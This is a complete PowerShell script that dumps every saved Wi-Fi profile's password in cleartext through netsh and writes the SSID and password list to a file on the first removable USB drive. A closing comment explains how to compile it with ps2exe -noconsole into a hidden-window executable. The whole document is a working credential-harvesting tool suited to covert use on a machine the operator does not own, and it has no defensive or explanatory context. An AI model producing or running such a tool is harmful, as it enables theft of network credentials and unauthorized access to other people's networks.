$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.Line.Split(":")[1].Trim()
}
$wifiCredentials = "SSID : PASSWORD`n"
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $ssid = $profile
    $password = ($profileDetails | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }) -join ""
    if (-not $password) {
        $password = "No password found"
    }
    $wifiCredentials += "$ssid : $password`n"
}
$usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1
if (-not $usbDrive) {
    Write-Host "No USB drive detected. Please insert a USB drive and try again."
    exit
}
$filePath = "$($usbDrive.DeviceID)\support\wifi_credentials.txt"
$wifiCredentials | Out-File -FilePath $filePath -Encoding UTF8
# to compile this file: ps2exe -noconsole -inputFile your_script.ps1 -outputFile your_script.exe
